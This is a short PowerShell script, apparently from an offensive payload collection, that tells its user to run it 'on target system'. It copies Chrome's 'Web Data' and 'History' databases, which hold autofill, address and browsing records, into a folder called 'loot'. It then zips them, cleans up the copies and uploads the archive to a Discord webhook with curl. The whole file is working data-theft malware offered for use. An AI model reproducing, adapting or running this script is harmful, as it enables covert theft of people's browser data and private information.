<# ====================== Chrome DB Files to Discord =======================

SYNOPSIS
Chrome stores visited websites, password entries, Address entries, email entries and more inside database files
They can be extracted to a discord chat and viewed in something like 'DB Browser'.

USAGE
1. Replace YOUR_WEBHOOK_HERE with your webhook
2. Run script on target system
3. Check Discord for results 
4. Extract Zip and view files in 'DB Browser' or alike.

#>

$dc = "$dc"

$sourceDir = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
$tempFolder = [System.IO.Path]::GetTempPath() + "loot"
if (!(Test-Path $tempFolder)){
    New-Item -Path $tempFolder -ItemType Directory -Force
}

$filesToCopy = Get-ChildItem -Path $sourceDir -Filter '*' -Recurse | Where-Object { $_.Name -like 'Web Data' -or $_.Name -like 'History' }
foreach ($file in $filesToCopy) {
    $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
    $newFileName = $file.BaseName + "_" + $randomLetters + $file.Extension
    $destination = Join-Path -Path $tempFolder -ChildPath $newFileName
    Copy-Item -Path $file.FullName -Destination $destination -Force
}
$zipFileName = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "loot.zip")
Compress-Archive -Path $tempFolder -DestinationPath $zipFileName
$tempFolders = Get-ChildItem -Path $tempFolder -Directory
foreach ($folder in $tempFolders) {
    if ($folder.Name -ne "loot") {
        Remove-Item -Path $folder.FullName -Recurse -Force
    }
}
Remove-Item -Path $tempFolder -Recurse -Force

curl.exe -F file1=@"$zipFileName" $dc | Out-Null